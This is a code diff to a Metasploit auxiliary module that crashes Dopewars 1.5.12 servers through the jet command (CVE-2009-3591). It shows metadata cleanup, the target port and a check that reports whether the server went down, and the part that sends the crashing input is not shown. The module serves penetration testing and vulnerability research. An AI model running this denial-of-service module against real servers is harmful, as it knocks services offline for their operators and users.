@@ -16,17 +16,20 @@ class Metasploit4 < Msf::Auxiliary
 		super(update_info(info,
 			'Name'			 => 'Dopewars Denial of Service',
 			'Description'	 => %q{
-				The jet command in Dopewars 1.5.12 is vulnerable to a segmentaion fault due to a lack of input validation.
+					The jet command in Dopewars 1.5.12 is vulnerable to a segmentaion fault due to
+				a  lack of input validation.
 			},
 			'Author'		 => [ 'Doug Prostko <dougtko[at]gmail.com>' ],
 			'License'		 => MSF_LICENSE,
 			'References'	 =>
 				[
-					[ 'BID', '36606' ],
 					[ 'CVE', '2009-3591' ],
-				]))
+					[ 'OSVDB', '58884' ],
+					[ 'BID', '36606' ]
+				],
+			'DisclosureDate' => "Oct 05 2009" ))
 
-			register_options([Opt::RPORT(7902),], self.class)
+		register_options([Opt::RPORT(7902)], self.class)
 	end
 
 	def run
@@ -44,13 +47,13 @@ class Metasploit4 < Msf::Auxiliary
 		disconnect
 
 		print_status("Checking for success...")
-		sleep 2
+		select(nil, nil, nil, 2)
 		begin
 			connect
 		rescue ::Interrupt
 			raise $!
 		rescue ::Rex::ConnectionRefused
-			print_good("Dopewars server succesfully shut down!")
+			print_good("Dopewars server successfully shut down!")
 		else
 			print_error("DOS attack unsuccessful")
 		ensure
